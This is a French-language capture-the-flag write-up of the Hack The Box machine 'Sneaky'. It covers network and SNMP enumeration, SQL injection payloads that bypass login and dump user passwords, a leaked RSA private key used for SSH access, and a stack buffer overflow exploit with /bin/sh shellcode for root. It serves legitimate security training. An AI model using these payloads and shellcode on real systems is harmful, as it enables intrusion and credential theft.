# HTB - Sneaky  10.10.10.20


- Linux 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 athlon i686 GNU/Linux
- Ubuntu 14.04.5 LTS

- Server: Apache/2.4.7 (Ubuntu)
- X-Powered-By: PHP/5.5.9-1ubuntu4.21

- Trouver /dev avec birb ou gobuster
- Trouver une sqli sur le champ password, qui permet de se logguer et télécharger une clef rsa pour ssh
- Trouver le port UDP snmp
  - Recupérer l'adresse IPv6 par snmp
- ssh IPv6 avec rsa_id => user

- sbit sur binaire custom
  - ALSR non activé
  - overflow classique avec playload /bin/sh => root



## NMap TCP

```
# nmap -sC -sV -A  10.10.10.20 -p-
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-20 14:18 CEST
Nmap scan report for 10.10.10.20
Host is up (0.033s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION


80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Under Development!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

```

## NMap UDP

```
# nmap -sU -sV -A  10.10.10.20
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-20 14:22 CEST
Nmap scan report for 10.10.10.20
Host is up (0.031s latency).
Not shown: 981 closed ports
PORT      STATE         SERVICE       VERSION
42/udp    open|filtered nameserver
161/udp   open          snmp          SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: fcf2da02d0831859
|   snmpEngineBoots: 8
|_  snmpEngineTime: 47m31s
| snmp-interfaces: 
|   lo
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 10 Mbps
|     Traffic stats: 127.48 Kb sent, 127.48 Kb received
|   eth0
|     IP address: 10.10.10.20  Netmask: 255.255.255.0
|     MAC address: 00:50:56:8f:4d:81 (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|_    Traffic stats: 292.24 Mb sent, 205.18 Mb received
| snmp-netstat: 
|   TCP  127.0.0.1:3306       0.0.0.0:0
|_  UDP  0.0.0.0:161          *:*
| snmp-processes: 
|   1: 
|     Name: init
|     Path: /sbin/init
|   383: 
|     Name: upstart-udev-br
|     Path: upstart-udev-bridge
|     Params: --daemon
|   389: 
|     Name: systemd-udevd
|     Path: /lib/systemd/systemd-udevd
|     Params: --daemon
|   466: 
|     Name: dbus-daemon
|     Path: dbus-daemon
|     Params: --system --fork
|   481: 
|     Name: systemd-logind
|     Path: /lib/systemd/systemd-logind
|   487: 
|     Name: rsyslogd
|     Path: rsyslogd
|   497: 
|     Name: upstart-file-br
|     Path: upstart-file-bridge
|     Params: --daemon
|   915: 
|     Name: upstart-socket-
|     Path: upstart-socket-bridge
|     Params: --daemon
|   951: 
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty4
|   954: 
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty5
|   959: 
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty2
|   960: 
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty3
|   963: 
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty6
|   997: 
|     Name: sshd
|     Path: /usr/sbin/sshd
|     Params: -D
|   998: 
|     Name: atd
|     Path: atd
|   999: 
|     Name: cron
|     Path: cron
|   1000: 
|     Name: acpid
|     Path: acpid
|     Params: -c /etc/acpi/events -s /var/run/acpid.socket
|   1056: 
|     Name: mysqld
|     Path: /usr/sbin/mysqld
|   1071: 
|     Name: snmpd
|     Path: /usr/sbin/snmpd
|     Params: -Lsd -Lf /dev/null -u snmp -g snmp -I -smux mteTrigger mteTriggerConf -p /var/run/snmpd.pid
|   1095: 
|     Name: vmtoolsd
|     Path: /usr/bin/vmtoolsd
|   1178: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1221: 
|     Name: getty
|     Path: /sbin/getty
|     Params: -8 38400 tty1
|   1476: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1477: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1490: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1499: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1503: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1508: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1513: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1514: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1515: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1517: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1518: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|     Params: -k start
|   1519: 
|     Name: apache2
|     Path: /usr/sbin/apache2
|_    Params: -k start
| snmp-sysdescr: Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
|_  System uptime: 47m31.17s (285117 timeticks)
|_snmp-win32-software: ERROR: Script execution failed (use -d to debug)
2161/udp  open|filtered apc-2161
3389/udp  open|filtered ms-wbt-server
3659/udp  open|filtered apple-sasl
17282/udp open|filtered unknown
18605/udp open|filtered unknown
20279/udp open|filtered unknown
20518/udp open|filtered unknown
21621/udp open|filtered unknown
22055/udp open|filtered unknown
29078/udp open|filtered unknown
33354/udp open|filtered unknown
34433/udp open|filtered unknown
34579/udp open|filtered unknown
36489/udp open|filtered unknown
37393/udp open|filtered unknown
49201/udp open|filtered unknown
50497/udp open|filtered unknown
Device type: storage-misc|phone|general purpose|media device
Running: Buffalo embedded, Google Android 6.X, Linux 2.6.X|3.X, Sony embedded
OS CPE: cpe:/o:google:android:6.0.1 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3.13 cpe:/o:google:android
Too many fingerprints match this host to give specific OS details
Network Distance: 2 hops
Service Info: Host: Sneaky

TRACEROUTE (using port 18255/udp)
HOP RTT      ADDRESS
1   29.89 ms 10.10.14.1
2   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2634.18 seconds
```

## 80: http://10.10.10.20

![](img/10.10.10.20.png)

Server: Apache/2.4.7 (Ubuntu)



### dirb - common  => /dev

```
# dirb http://10.10.10.20

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Sep 20 14:23:17 2019
URL_BASE: http://10.10.10.20/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.20/ ----
==> DIRECTORY: http://10.10.10.20/dev/                                                                                                         
+ http://10.10.10.20/index.html (CODE:200|SIZE:183)                                                                                            
+ http://10.10.10.20/server-status (CODE:403|SIZE:291)                                                                                         
                                                                                                                                               
---- Entering directory: http://10.10.10.20/dev/ ----
+ http://10.10.10.20/dev/index.html (CODE:200|SIZE:464)        
```



### gobuster : medium-2.3



## http://10.10.10.20/dev/

![](img/10.10.10.20_dev.png)

- sqli
- default pwd
- cmd


### Traces

```
POST /dev/login.php HTTP/1.1
Host: 10.10.10.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.20/dev/
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Connection: close
Upgrade-Insecure-Requests: 1

name=admin&pass=admin


HTTP/1.0 404 Not Found
Date: Fri, 20 Sep 2019 12:22:27 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Content-Length: 49
Connection: close
Content-Type: text/html

<?xml version="1.0" encoding="UTF-8"?>Not Found: 
```

### SQLI

Burp Repeater

```
name=a&pass=b'

HTTP/1.0 500 Internal Serever Error
Date: Fri, 20 Sep 2019 12:28:13 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.21
Content-Length: 62
Connection: close
Content-Type: text/html

<?xml version="1.0" encoding="UTF-8"?>Internal Serever Error: 
```

name=admin&pass=b' or 1=1 -- 
Loggin succesfull => http://10.10.10.20/dev/login.php


### SQLi advanced


Select Number of column in select
```
name=a&pass=admin' or 1=1 UNION select 1,1 -- -  
```
=> 2 

Get tables names
```
name=a&pass=admin' or 1=1 UNION SELECT table_name,table_name FROM information_schema.tables; -- -  


name: users
name: columns_priv
name: db
name: event
name: func
name: general_log
name: help_category
name: help_keyword
name: help_relation
name: help_topic
name: host
name: ndb_binlog_index
name: plugin
name: proc
name: procs_priv
name: proxies_priv
name: servers
name: slow_log
name: tables_priv
name: time_zone
name: time_zone_leap_second
name: time_zone_name
name: time_zone_transition
name: time_zone_transition_type


name: user
name: cond_instances
name: events_waits_current
name: events_waits_history
name: events_waits_history_long
name: events_waits_summary_by_instance
name: events_waits_summary_by_thread_by_event_name   ====> mysql 5.5, 5.6, mariadb
name: events_waits_summary_global_by_event_name
name: file_instances
name: file_summary_by_event_name
name: file_summary_by_instance
name: mutex_instances
name: performance_timers
name: rwlock_instances
name: setup_consumers
name: setup_instruments
name: setup_timers
name: threads

```


Get column names for : users
```
name=a&pass=admin' or 1=1 UNION SELECT column_name,column_name FROM information_schema.columns WHERE  table_name='users'; -- -
<dl>name: name</dl></dt>
<dt>
<dl>name: pass</dl>
```

dump table : users
```
name=a&pass=admin' or 1=1 UNION SELECT concat(name,':',pass),1 FROM users; -- -
<dl>name: admin:sup3rstr0ngp4ssf0r4d</dl>
</dt>
<dt>
<dl>name: thrasivoulos:sup3rstr0ngp4ssf0r4d</dl>
```

On liste les colones de la table des users interne de mysql
```
name=a&pass=admin' or 1=1 UNION SELECT column_name,column_name FROM information_schema.columns WHERE  table_name='user'; -- -
<dt>
<dl>name: User</dl>
</dt>
<dt>
<dl>name: Password</dl>
```
On tente de dumper la table des users interne de mysql

```
name=a&pass=admin' or 1=1 UNION SELECT concat(User,':',Password),1 FROM user; -- -
Internal Serever Error: 
```
.. pas les droits


## http://10.10.10.20/dev/login.php

```
DevWebsite Login

name: admin

name: thrasivoulos

My Key

Noone is ever gonna find this key :P
```




## http://10.10.10.20/dev/sshkeyforadministratordifficulttimes

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvQxBD5yRBGemrZI9F0O13j15wy9Ou8Z5Um2bC0lMdV9ckyU5
Lc4V+rY81lS4cWUx/EsnPrUyECJTtVXG1vayffJISugpon49LLqABZbyQzc4GgBr
3mi0MyfiGRh/Xr4L0+SwYdylkuX72E7rLkkigSt4s/zXp5dJmL2RBZDJf1Qh6Ugb
yDxG2ER49/wbdet8BKZ9EG7krGHgta4mfqrBbZiSBG1ST61VFC+G6v6GJQjC02cn
cb+zfPcTvcP0t63kdEreQbdASYK6/e7Iih/5eBy3i8YoNJd6Wr8/qVtmB+FuxcFj
oOqS9z0+G2keBfFlQzHttLr3mh70tgSA0fMKMwIDAQABAoIBAA23XOUYFAGAz7wa
Nyp/9CsaxMHfpdPD87uCTlSETfLaJ2pZsgtbv4aAQGvAm91GXVkTztYi6W34P6CR
h6rDHXI76PjeXV73z9J1+aHuMMelswFX9Huflyt7AlGV0G/8U/lcx1tiWfUNkLdC
CphCICnFEK3mc3Mqa+GUJ3iC58vAHAVUPIX/cUcblPDdOmxvazpnP4PW1rEpW8cT
OtsoA6quuPRn9O4vxDlaCdMYXfycNg6Uso0stD55tVTHcOz5MXIHh2rRKpl4817a
I0wXr9nY7hr+ZzrN0xy5beZRqEIdaDnQG6qBJFeAOi2d7RSnSU6qH08wOPQnsmcB
JkQxeUkCgYEA3RBR/0MJErfUb0+vJgBCwhfjd0x094mfmovecplIUoiP9Aqh77iz
5Kn4ABSCsfmiYf6kN8hhOzPAieARf5wbYhdjC0cxph7nI8P3Y6P9SrY3iFzQcpHY
ChzLrzkvV4wO+THz+QVLgmX3Yp1lmBYOSFwIirt/MmoSaASbqpwhPSUCgYEA2uym
+jZ9l84gdmLk7Z4LznJcvA54GBk6ESnPmUd8BArcYbla5jdSCNL4vfX3+ZaUsmgu
7Z9lLVVv1SjCdpfFM79SqyxzwmclXuwknC2iHtHKDW5aiUMTG3io23K58VDS0VwC
GR4wYcZF0iH/t4tn02qqOPaRGJAB3BD/B8bRxncCgYBI7hpvITl8EGOoOVyqJ8ne
aK0lbXblN2UNQnmnywP+HomHVH6qLIBEvwJPXHTlrFqzA6Q/tv7E3kT195MuS10J
VnfZf6pUiLtupDcYi0CEBmt5tE0cjxr78xYLf80rj8xcz+sSS3nm0ib0RMMAkr4x
hxNWWZcUFcRuxp5ogcvBdQKBgQDB/AYtGhGJbO1Y2WJOpseBY9aGEDAb8maAhNLd
1/iswE7tDMfdzFEVXpNoB0Z2UxZpS2WhyqZlWBoi/93oJa1on/QJlvbv4GO9y3LZ
LJpFwtDNu+XfUJ7irbS51tuqV1qmhmeZiCWIzZ5ahyPGqHEUZaR1mw2QfTIYpLrG
UkbZGwKBgGMjAQBfLX0tpRCPyDNaLebFEmw4yIhB78ElGv6U1oY5qRE04kjHm1k/
Hu+up36u92YlaT7Yk+fsk/k+IvCPum99pF3QR5SGIkZGIxczy7luxyxqDy3UfG31
rOgybvKIVYntsE6raXfnYsEcvfbaE0BsREpcOGYpsE+i7xCRqdLb
-----END RSA PRIVATE KEY-----
```

## SNMPWalk

=> snmp_walk.txt

### Get IPv6 adresse

iso. org. dod. internet. mgmt. mib-2. ip. ipAddressTable
1.   3.   6.   1.        2.    1.     4.  34.              1.3

```
# snmpwalk -v2c -c public 10.10.10.20 1.3.6.1.2.1.4.34.1.3
IP-MIB::ipAddressIfIndex.ipv4."10.10.10.20" = INTEGER: 2
IP-MIB::ipAddressIfIndex.ipv4."10.10.10.255" = INTEGER: 2
IP-MIB::ipAddressIfIndex.ipv4."127.0.0.1" = INTEGER: 1
IP-MIB::ipAddressIfIndex.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: 1
IP-MIB::ipAddressIfIndex.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:8f:4d:81" = INTEGER: 2
IP-MIB::ipAddressIfIndex.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:8f:4d:81" = INTEGER: 2
```

=> dead:beef::0250:56ff:fe8f:4d81

## NMap IPv6
```
# nmap -sV -A -6 dead:beef::0250:56ff:fe8f:4d81
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-20 15:49 CEST
Nmap scan report for dead:beef::250:56ff:fe8f:4d81
Host is up (0.031s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 5d:5d:2a:97:85:a1:20:e2:26:e4:13:54:58:d6:a4:22 (DSA)
|   2048 a2:00:0e:99:0f:d3:ed:b0:19:d4:6b:a8:b1:93:d9:87 (RSA)
|   256 e3:29:c4:cb:87:98:df:99:6f:36:9f:31:50:e3:b9:42 (ECDSA)
|_  256 e6:85:a8:f8:62:67:f7:01:28:a1:aa:00:b5:60:f2:21 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 400 Bad Request
No OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=6%D=9/20%OT=22%CT=1%CU=32776%PV=N%DS=1%DC=D%G=Y%TM=5D84D8
OS:DA%P=x86_64-pc-linux-gnu)S1(P=60082f0c0028063fXX{32}0016e3be1b4b6862a3c
OS:70f28a0126f9021820000020405390402080a0013ac26ff{4}01030307%ST=0.063536%
OS:RT=0.095448)S2(P=6008028b0028063fXX{32}0016e3bf95be8d56a3c70f29a0126f90
OS:81ff0000020405390402080a0013ac3fff{4}01030307%ST=0.163649%RT=0.192829)S
OS:3(P=600a99ee0028063fXX{32}0016e3c02ba8d85fa3c70f2aa0126f90a3f2000002040
OS:5390101080a0013ac58ff{4}01030307%ST=0.265169%RT=0.295216)S4(P=600f63f50
OS:028063fXX{32}0016e3c107cf668ea3c70f2ba0126f9036810000020405390402080a00
OS:13ac71ff{4}01030307%ST=0.363674%RT=0.394119)S5(P=600edab70028063fXX{32}
OS:0016e3c2edc8190ba3c70f2ca0126f909dee0000020405390402080a0013ac8bff{4}01
OS:030307%ST=0.463713%RT=0.499378)S6(P=60095b2c0024063fXX{32}0016e3c34568e
OS:03ca3c70f2d90126f9093110000020405390402080a0013aca3ff{4}%ST=0.563455%RT
OS:=0.595317)IE1(P=600763a800803a3fXX{32}8109e1c0abcd00{122}%ST=0.596616%R
OS:T=0.630336)IE2(P=6005499b00583a3fXX{32}0401e32700{3}386001234500280026X
OS:X{32}3c00010400{4}2b00010400{12}3a00010400{4}8000e340abcd0001%ST=0.6466
OS:76%RT=0.67766)U1(P=6003a83d01643a3fXX{32}0104784b00{4}600123450134112fX
OS:X{32}e37e800801343fe843{300}%ST=0.745205%RT=0.775142)TECN(P=60062a51002
OS:0063fXX{32}0016e3c431983a30a3c70f2e805270800b76000002040539010104020103
OS:0307%ST=0.794489%RT=0.828406)T4(P=6007a4b70014063fXX{32}0016e3c7b246073
OS:900{4}5004000021d60000%ST=0.946108%RT=0.97906)T5(P=600972920014063fXX{3
OS:2}0001e3c800{4}a3c70f325014000028600000%ST=0.9953%RT=1.02512)T6(P=6003e
OS:a130014063fXX{32}0001e3c9bc7ad43e00{4}500400004aaf0000%ST=1.04602%RT=1.
OS:07627)T7(P=6003db6a0014063fXX{32}0001e3ca00{4}a3c70f3450140000285c0000%
OS:ST=1.09557%RT=1.12482)EXTRA(FL=12345)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| address-info: 
|   IPv6 EUI-64: 
|     MAC address: 
|       address: 00:50:56:8f:4d:81
|_      manuf: VMware

TRACEROUTE
HOP RTT      ADDRESS
1   30.84 ms dead:beef::250:56ff:fe8f:4d81

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.64 seconds
root@kali:~/htb/YoloToolbox/machines/htb/sneaky# 

```


## ssh thrasivoulos@dead:beef::0250:56ff:fe8f:4d81


```
# ssh -i loot/sshkeyforadministratordifficulttimes.key thrasivoulos@dead:beef::0250:56ff:fe8f:4d81
The authenticity of host 'dead:beef::250:56ff:fe8f:4d81 (dead:beef::250:56ff:fe8f:4d81)' can't be established.
ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'dead:beef::250:56ff:fe8f:4d81' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Fri Sep 20 15:13:41 EEST 2019

  System load: 0.0               Memory usage: 5%   Processes:       178
  Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Your Hardware Enablement Stack (HWE) is supported until April 2019.
Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
thrasivoulos@Sneaky:~$ id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) groups=1000(thrasivoulos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
thrasivoulos@Sneaky:~$ cat user.txt
XXXXXXXXXXXXXXXXXXXXXXXXXX
```


## System

```
$ uname -a
Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686 athlon i686 GNU/Linux
thrasivoulos@Sneaky:~$ cat /etc/issue
Ubuntu 14.04.5 LTS \n \l
```


## Escalate

```


$ find / -perm -4000 2>/dev/null | xargs ls -al
-rwsr-xr-x 1 root    root        30112 May 15  2015 /bin/fusermount
-rwsr-xr-x 1 root    root        88752 Nov 24  2016 /bin/mount
-rwsr-xr-x 1 root    root        38932 May  8  2014 /bin/ping
-rwsr-xr-x 1 root    root        43316 May  8  2014 /bin/ping6
-rwsr-xr-x 1 root    root        35300 May  4  2017 /bin/su
-rwsr-xr-x 1 root    root        67704 Nov 24  2016 /bin/umount
-rwsr-sr-x 1 daemon  daemon      46652 Oct 21  2013 /usr/bin/at
-rwsr-xr-x 1 root    root        44620 May  4  2017 /usr/bin/chfn
-rwsr-xr-x 1 root    root        35916 May  4  2017 /usr/bin/chsh
-rwsr-xr-x 1 root    root        66284 May  4  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root    root        72860 Oct 21  2013 /usr/bin/mtr
-rwsr-xr-x 1 root    root        30984 May  4  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root    root        45420 May  4  2017 /usr/bin/passwd
-rwsr-xr-x 1 root    root        18168 Nov 24  2015 /usr/bin/pkexec
-rwsr-xr-x 1 root    root       156708 Oct 14  2016 /usr/bin/sudo
-rwsr-xr-x 1 root    root        18136 May  8  2014 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root    messagebus 333952 Dec  7  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root    root         5480 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root    root       492972 Aug 11  2016 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root    root         9808 Nov 24  2015 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsrwsr-x 1 root    root         7301 May  4  2017 /usr/local/bin/chal
-rwsr-xr-- 1 root    dip        323000 Apr 21  2015 /usr/sbin/pppd
-rwsr-sr-x 1 libuuid libuuid     17996 Nov 24  2016 /usr/sbin/uuidd


thrasivoulos@Sneaky:~$ /usr/local/bin/chal
Segmentation fault (core dumped)


thrasivoulos@Sneaky:~$ /usr/local/bin/chal a
thrasivoulos@Sneaky:~$ /usr/local/bin/chal aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
thrasivoulos@Sneaky:~$ /usr/local/bin/chal aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
thrasivoulos@Sneaky:~$ 
thrasivoulos@Sneaky:~$ 
thrasivoulos@Sneaky:~$ 
thrasivoulos@Sneaky:~$ /usr/local/bin/chal $(python -c 'print "A"*1000;')
Segmentation fault (core dumped)


$ cat   /proc/sys/kernel/randomize_va_space 
0




for i in `seq 350 370`; do echo $i; /usr/local/bin/chal $(python -c "print 'A'*$i"); if [[ $? != 0 ]]; then break; fi; done;

100
101
......
360
361
362
Segmentation fault (core dumped)


for i in `seq 362 366`; do echo $i; gdb -batch -ex='run' -args /usr/local/bin/chal $(python -c "print 'A'*$i+'BBBB'"); done; 
362

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
363

Program received signal SIGSEGV, Segmentation fault.
0x42424241 in ?? ()
364

Program received signal SIGSEGV, Segmentation fault.
0x42424141 in ?? ()
365

Program received signal SIGSEGV, Segmentation fault.
0x42414141 in ?? ()
366

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

=>> 362


Test Jump ESP ?

objdump -d /usr/local/bin/chal | grep esp | grep jmp
Negatif...

$ gdb -batch -ex='unset env LINES' -ex='unset env COLUMNS' -ex='b 21' -ex='run' -ex='x/300x $esp' -args  /usr/local/bin/chal $(python -c "print '\x90'*(362-45)+'\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'+'BBBB'") 
No symbol table is loaded.  Use the "file" command.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
0xbffff580:	0x00000042	0xbffff614	0xbffff620	0xb7feccca
0xbffff590:	0x00000002	0xbffff614	0xbffff5b4	0x0804a014
0xbffff5a0:	0x0804821c	0xb7fce000	0x00000000	0x00000000
0xbffff5b0:	0x00000000	0x38329219	0x00acf609	0x00000000
0xbffff5c0:	0x00000000	0x00000000	0x00000002	0x08048320
0xbffff5d0:	0x00000000	0xb7ff24c0	0xb7e3ba09	0xb7fff000
0xbffff5e0:	0x00000002	0x08048320	0x00000000	0x08048341
0xbffff5f0:	0x0804841d	0x00000002	0xbffff614	0x08048450
0xbffff600:	0x080484c0	0xb7fed160	0xbffff60c	0x0000001c
0xbffff610:	0x00000002	0xbffff734	0xbffff748	0x00000000
0xbffff620:	0xbffff8b8	0xbffff8c9	0xbffff8d9	0xbffff8ed
0xbffff630:	0xbffff913	0xbffff926	0xbffff938	0xbffffe59
0xbffff640:	0xbffffeb7	0xbffffed3	0xbffffee2	0xbffffef9
0xbffff650:	0xbfffff0a	0xbfffff22	0xbfffff2a	0xbfffff3f
0xbffff660:	0xbfffff87	0xbfffffa7	0xbfffffc6	0x00000000
0xbffff670:	0x00000020	0xb7fdccf0	0x00000021	0xb7fdc000
0xbffff680:	0x00000010	0x078bfbff	0x00000006	0x00001000
0xbffff690:	0x00000011	0x00000064	0x00000003	0x08048034
0xbffff6a0:	0x00000004	0x00000020	0x00000005	0x00000009
0xbffff6b0:	0x00000007	0xb7fde000	0x00000008	0x00000000
0xbffff6c0:	0x00000009	0x08048320	0x0000000b	0x000003e8
0xbffff6d0:	0x0000000c	0x000003e8	0x0000000d	0x000003e8
0xbffff6e0:	0x0000000e	0x000003e8	0x00000017	0x00000001
0xbffff6f0:	0x00000019	0xbffff71b	0x0000001f	0xbfffffe8
0xbffff700:	0x0000000f	0xbffff72b	0x00000000	0x00000000
0xbffff710:	0x00000000	0x00000000	0x83000000	0xc9c0738e
0xbffff720:	0x6cb363ec	0xf0557b58	0x69e67e3e	0x00363836
0xbffff730:	0x00000000	0x7273752f	0x636f6c2f	0x622f6c61
0xbffff740:	0x632f6e69	0x006c6168	0x90909090	0x90909090
0xbffff750:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff760:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff770:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff780:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff790:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff7f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff800:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff810:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff820:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff830:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff840:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff850:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff860:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff870:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff880:	0x90909090	0x1feb9090	0x0876895e	0x4688c031
0xbffff890:	0x0c468907	0xf3890bb0	0x8d084e8d	0x80cd0c56
0xbffff8a0:	0xd889db31	0xe880cd40	0xffffffdc	0x6e69622f
0xbffff8b0:	0x4268732f	0x00424242	0x5f474458	0x53534553
0xbffff8c0:	0x5f4e4f49	0x313d4449	0x45485300	0x2f3d4c4c
0xbffff8d0:	0x2f6e6962	0x68736162	0x52455400	0x74783d4d
0xbffff8e0:	0x2d6d7265	0x63363532	0x726f6c6f	0x48535300
0xbffff8f0:	0x494c435f	0x3d544e45	0x64616564	0x6565623a
0xbffff900:	0x3a323a66	0x3130313a	0x32342030	0x20383433
0xbffff910:	0x53003232	0x545f4853	0x2f3d5954	0x2f766564
0xbffff920:	0x2f737470	0x53550030	0x743d5245	0x73617268
0xbffff930:	0x756f7669	0x00736f6c	0x435f534c	0x524f4c4f
0xbffff940:	0x73723d53	0x643a303d	0x31303d69	0x3a34333b
0xbffff950:	0x303d6e6c	0x36333b31	0x3d686d3a	0x703a3030
0xbffff960:	0x30343d69	0x3a33333b	0x303d6f73	0x35333b31
0xbffff970:	0x3d6f643a	0x333b3130	0x64623a35	0x3b30343d
0xbffff980:	0x303b3333	0x64633a31	0x3b30343d	0x303b3333
0xbffff990:	0x726f3a31	0x3b30343d	0x303b3133	0x75733a31
0xbffff9a0:	0x3b37333d	0x733a3134	0x30333d67	0x3a33343b
0xbffff9b0:	0x333d6163	0x31343b30	0x3d77743a	0x343b3033
0xbffff9c0:	0x776f3a32	0x3b34333d	0x733a3234	0x37333d74
